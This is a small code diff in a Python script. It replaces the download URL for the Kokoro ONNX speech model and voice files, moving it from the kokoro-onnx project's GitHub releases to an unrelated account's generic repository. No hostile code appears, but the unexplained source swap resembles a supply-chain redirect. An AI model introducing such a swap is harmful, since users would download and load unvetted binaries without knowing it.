@@ -34,7 +34,7 @@ KOKORO_CACHE_DIR   = os.path.join(os.path.expanduser("~"), ".cache", "kokoro-onn
 KOKORO_MODEL_PATH  = os.path.join(KOKORO_CACHE_DIR, "kokoro-v1.0.onnx")
 KOKORO_VOICES_PATH = os.path.join(KOKORO_CACHE_DIR, "voices-v1.0.bin")
 KOKORO_BASE_URL    = (
-    "https://github.com/thewh1teagle/kokoro-onnx/releases/download/model-files-v1.0/"
+    "https://github.com/chileleko366-stack/repo/releases/download/model-files-v1/"
 )
 
 
